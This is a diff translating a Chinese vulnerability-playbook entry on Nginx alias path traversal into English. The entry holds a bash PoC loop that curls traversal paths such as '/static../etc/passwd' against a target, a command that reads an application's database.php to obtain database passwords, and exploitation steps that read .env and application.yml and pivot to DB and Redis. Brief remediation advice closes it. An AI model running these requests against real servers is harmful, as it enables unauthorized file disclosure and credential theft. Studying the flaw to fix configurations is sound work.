@@ -1,54 +1,54 @@
 ﻿---
-title: Nginx alias 路径穿越（读任意文件/源码泄露）
-cve: 无（配置缺陷）
+title: Nginx alias path traversal (arbitrary file read/source code disclosure)
+cve: None (configuration flaw)
 severity: high
 cvss: 7.8
-product: Nginx（location alias 缺尾斜杠）
-versions: 任意
+product: Nginx (missing trailing slash in location alias configuration)
+versions: Any
 ports: 80, 443
-keywords: nginx, alias, 穿越, 目录, 源码, 配置
-entry: /static../  /files..;/  alias 无 / 结尾
+keywords: nginx, alias, traversal, directory, source code, configuration
+entry: /static../  /files..;/  alias without a trailing /
 verified: false
-sources: 公开资料整理（配置缺陷类）
+sources: Compiled from public sources (configuration flaws)
 ---
 
-## 指纹
+## Fingerprinting
 
 ```
 GET /static/../etc/passwd     → 403/200
-GET /files../WEB-INF/web.xml  → 200 = 命中
+GET /files../WEB-INF/web.xml  → 200 = positive result
 ```
 
-## 前置条件
+## Prerequisites
 
-- 配置形如 `location /static { alias /data/static/; }`（少一个 `/`）。
+- Configuration such as `location /static { alias /data/static/; }` (one `/` is missing).
 
 ## PoC
 
 ```bash
-# 1) 常见穿越形态
+# 1) Common traversal patterns
 for p in '/static../etc/passwd' '/static/../etc/passwd' '/files../etc/passwd' \
          '/static..%2fetc%2fpasswd' '/static/..%2f..%2fetc%2fpasswd'; do
   echo "$p → $(curl -s -o /tmp/t -w '%{http_code}' "https://target$p") $(head -c 40 /tmp/t | tr -d '\n')"
 done
-# 判定：返回 root:x:0:0 = 命中
+# Result: root:x:0:0 in the response = positive result
 
-# 2) 读应用配置（拿数据库口令）
+# 2) Read application configuration (obtain database passwords)
 curl -s 'https://target/static../app/config/database.php' | head -20
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 先探 alias 路径（`/static /files /upload /img`）；
-2. 命中后读 `web.xml`、`application.yml`、`.env`；
-3. 拿到 DB/Redis 口令 → 转数据库/缓存条目继续；
-4. 证据：HTTP 200 + 文件前几行。
+1. Probe alias paths first (`/static /files /upload /img`);
+2. After a positive result, read `web.xml`, `application.yml`, and `.env`;
+3. Obtain DB/Redis passwords → continue with the database/cache entries;
+4. Evidence: HTTP 200 + the first few lines of the file.
 
-## 修复与缓解
+## Remediation and Mitigation
 
-- `location /static/ { alias /data/static/; }` 保持尾斜杠一致；或改用 `root`；
-- 上传目录禁脚本执行。
+- Keep trailing slashes consistent: `location /static/ { alias /data/static/; }`; or use `root` instead;
+- Disable script execution in upload directories.
 
-## 参考
+## References
 
-- Nginx 文档 alias 语义；公开配置错误分析。
+- Nginx documentation on alias semantics; public analyses of configuration errors.
